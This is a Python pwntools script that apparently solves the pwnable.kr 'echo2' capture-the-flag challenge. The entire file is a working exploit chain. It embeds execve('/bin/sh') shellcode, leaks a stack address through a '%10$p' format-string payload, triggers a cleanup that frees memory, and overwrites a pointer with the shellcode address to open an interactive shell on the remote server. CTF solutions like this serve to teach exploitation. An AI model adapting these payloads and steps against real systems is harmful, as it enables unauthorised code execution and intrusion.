from pwn import *


class Echo2Exploit(object):
    EXECVE_BIN_SH_SHELLCODE = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    GREETINGS_OFFSET_FROM_USERNAME = 24
    SHELLCODE_OFFSET_FROM_STACK_BASE = 0x20

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9011)
        self.shellcode_address = 0

    def send_shellcode(self):
        print(self.shell.recvuntil(":"))
        self.shell.sendline(self.EXECVE_BIN_SH_SHELLCODE)

    def leak_shellcode_address(self):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("2")
        print(self.shell.recv())
        self.shell.sendline("%10$p")
        print(self.shell.recv())
        self.shellcode_address = int(self.shell.recv(), base=16) - self.SHELLCODE_OFFSET_FROM_STACK_BASE
        print("leaked shellcode address:", hex(self.shellcode_address))

    def activate_cleanup(self):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("4")
        print(self.shell.recv())
        self.shell.sendline("n")

    def overwrite_greetings_with_shellcode_address(self):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("3")
        print(self.shell.recv())
        print(self.shell.recv())
        self.shell.sendline(b"A" * self.GREETINGS_OFFSET_FROM_USERNAME + p64(self.shellcode_address))

    def activate_shellcode(self):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("2")
        self.shell.interactive()

    def run(self):
        self.send_shellcode()
        self.leak_shellcode_address()
        self.activate_cleanup()
        self.overwrite_greetings_with_shellcode_address()
        self.activate_shellcode()


if __name__ == '__main__':
    Echo2Exploit().run()
